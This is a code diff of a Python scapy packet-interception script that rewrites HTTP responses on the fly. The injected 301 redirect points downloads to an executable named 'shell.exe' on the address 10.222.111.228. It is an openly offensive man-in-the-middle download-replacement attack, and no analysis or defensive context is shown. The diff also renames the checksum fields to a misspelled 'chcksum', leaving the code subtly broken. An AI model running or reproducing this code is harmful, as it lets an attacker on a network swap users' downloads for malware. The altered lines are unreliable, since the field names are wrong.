@@ -27,8 +27,8 @@ ack_list = []
 def set_load(packet, load):
     packet[scapy.Raw].load = load
     del packet[scapy.IP].len
-    del packet[scapy.IP].chksum
-    del packet[scapy.TCP].chksum
+    del packet[scapy.IP].chcksum
+    del packet[scapy.TCP].chcksum
     return packet
 
 
@@ -46,7 +46,6 @@ def process_packet(packet):
                 modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.222.111.228/shell.exe\n\n")
                 print(scapy_packet.show())
                 packet.set_payload(bytes(modified_packet))
-
     packet.accept()  # Forwards packets
     # packet.drop()  # Drops packets
 
